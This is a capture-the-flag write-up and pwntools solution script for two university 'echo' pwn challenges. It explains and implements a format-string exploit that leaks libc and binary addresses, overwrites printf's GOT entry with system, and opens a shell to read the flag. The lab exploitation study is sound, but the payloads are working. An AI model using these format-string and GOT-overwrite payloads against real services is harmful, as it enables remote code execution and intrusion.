"""
# #8 echo - echo2.0

## Type
Pwn

## Vulnerability type
Format string

## Description
* Challenge 1: I made my own echo implementation, so that it's more efficient than the system one. I noticed that sometimes it doesn't work as expected, but I'm sure it's just a minor bug. Haven't GOTten the time to fix it!
* Challenge 2: I made my own echo implementation, so that it's more efficient than the system one. I noticed that sometimes it doesn't work as expected, but I'm sure it's just a minor bug. Haven't GOTten the time to fix it!

## Explaination
* Locate the GOT address where the binary will search for the printf function. 
  This step is essential because libc is dynamically linked, causing the actual address of the printf function to change with each execution. 
  Thus, it is necessary to proceed step-by-step, starting from the GOT address. To accomplish this, it is possible to use the command `ELF("./bin").got["printf"]` to extract it.

* Next, it is necessary to examine the address pointed by this address. 
  This can be achieved by sending a payload containing 8 (random) padding characters followed by the GOT address of the printf function. 
  The padding characters are necessary so the address can be manipulated using format string vulnerability. 
  Once done, the “real” address of the printf function can be extracted by sending a second payload containing a special string format: `%7$s`. 
  Where `%7` is used to refer to the address previously written, while `$s` is used to dereferencing its content. So, since it contains the real address of the printf, it will return that address.

* Now, it is possible to calculate and set the base address of the libc library by using the known real address of the printf function and its offset (the distance between the printf function and the start of the libc library). 
  This offset can be obtained by executing `ELF("./libc.so.6").sym["printf"]`.
  To facilitate the next steps, assign the base address of the libc library to the address attribute of the `ELF("./libc.so.6")` object. 
  This ensures that subsequent operations will use the correct base address of the library.

* Next, the printf function needs to be replaced with the system function. 
  This can be achieved by injecting the following payload using a tool from the pwntools library designed for this purpose: `fmtstr_payload(6, {printf_got: libc.sym["system"]}, write_size="short")`.

* Then, by sending `/bin/bash` and then `cat flag.txt` it is possible to extract the flag.

For the second challenge, the approach is very similar to the first one. 
The only difference is that, since the binary uses ASLR, it is not possible to directly retrieve the GOT address of the printf function because the base address of the binary is unknown (randomized).

* The main idea is to use the binary from the first challenge to check the position (in terms of format strings) of the main address. 
  In this case, it is the 19th parameter. This can also be verified using the gdb tool. Therefore, in the second binary, simply send the payload `%19$p` to extract the address of main.

* Next, calculate the offset of the main function, which is the distance between it and the beginning of the binary. 
  This can be achieved by executing `ELF("./bin").sym["main"]`.

* Then, as done previously for libc, it is possible to "inform" the `ELF("./bin")` object about the actual position of the binary by calculating the difference between the main address and its offset and assigning it to the ELF object of the binary.

* Now, it is possible to follow the steps mentioned earlier to obtain the flag.

## Extra
This solution is not deterministic because it repeatedly runs the binaries until it succeeds. 
This is due to the fact that the binaries use ASLR, meaning that each run will have different addresses. 
Additionally, since the payloads are very large, they could cause the programs to crash if the addresses are close to something critical.
When the exploit successfully obtains the flag, it is because the tainted portions of memory do not cause the program to crash. 
Therefore, while this solution might not be the best, it can yield the maximum score if properly justified.

"""

from pwn import *

def echo(binary_file: str, libc_file: str) -> str:

	# Since the library is dynamically linked, .sym will return the offset from the base address
	libc = ELF(libc_file)
	printf_offset = libc.sym["printf"]

	# This will return the default address in the GOT of the printf function
	elf = context.binary = ELF(binary_file)
	printf_got = elf.got["printf"]

	while True:

		r = remote("cyberchallenge.disi.unitn.it", 50230)

		# Inject the GOT address in the stack
		payload = b"A" * 8 + p64(printf_got) #type: ignore
		r.sendlineafter(b"> ", payload)

		# This payload allows us to extract the address pointed to the default address of the printf function
		payload = b"%7$s"
		r.sendlineafter(b"> ", payload)
		printf_address = r.recvline()[:-1] + b"\x00" + b"\x00"
		printf_address = int.from_bytes(printf_address, "little")

		# Set the libc address since we know the actual printf address and the offset
		libc.address = printf_address - printf_offset

		# Inject the payload that will replace printf function with system
		payload = fmtstr_payload(6, {printf_got: libc.sym["system"]}, write_size="short")
		r.sendlineafter(b"> ", payload)
		r.sendline(b"/bin/sh")

		try:
			r.recvline()
			r.recvline()
			r.sendline(b"cat flag.txt")

			flag = r.recvline().decode("utf-8", errors="ignore").strip().replace(" ", "")
			return flag

		except:
			pass

		finally:
			r.close()

		r.close()


def echo2(binary_file: str, libc_file: str) -> str:

	while True:

		r = remote("cyberchallenge.disi.unitn.it", 50231)

		# Since the library is dynamically linked, .sym will return the offset from the base address
		libc = ELF(libc_file)
		printf_offset = libc.sym["printf"]

		# This will return the default address in the GOT of the printf function
		elf = context.binary = ELF(binary_file)

		# Extract the main address
		r.sendlineafter(b"> ", b"%19$p")
		main_address = r.recvline()[:-1]
		main_address = int(main_address, 16)

		# Calculate the base address of the binary
		elf.address = main_address - elf.sym["main"]

		# Extract the GOT address of printf
		printf_got = elf.got["printf"]
		
		# Inject the GOT address in the stack
		payload = b"A" * 8 + p64(printf_got) #type: ignore
		r.sendlineafter(b"> ", payload)

		# This payload allows us to extract the address pointed to the default address of the printf function
		payload = b"%7$s"
		r.sendlineafter(b"> ", payload)
		printf_address = r.recvline()[:-1] + b"\x00" + b"\x00"
		printf_address = int.from_bytes(printf_address, "little")

		# Set the libc address since we know the actual printf address and the offset
		libc.address = printf_address - printf_offset

		# Inject the payload that will replace printf function with system
		payload = fmtstr_payload(6, {printf_got: libc.sym["system"]}, write_size="short")
		r.sendlineafter(b"> ", payload)
		r.sendline(b"/bin/sh")

		try:
			r.recvline()
			r.recvline()
			r.sendline(b"cat flag.txt")

			flag = r.recvline().decode("utf-8", errors="ignore").strip().replace(" ", "")
			return flag

		except:
			pass

		finally:
			r.close()

		r.close()

if __name__ == "__main__":

    flag1 = echo(binary_file=..., libc_file=...)
    flag2 = echo2(binary_file=..., libc_file=...)

    print(f"echo: {flag1}")
    print(f"echo 2.0: {flag2}")
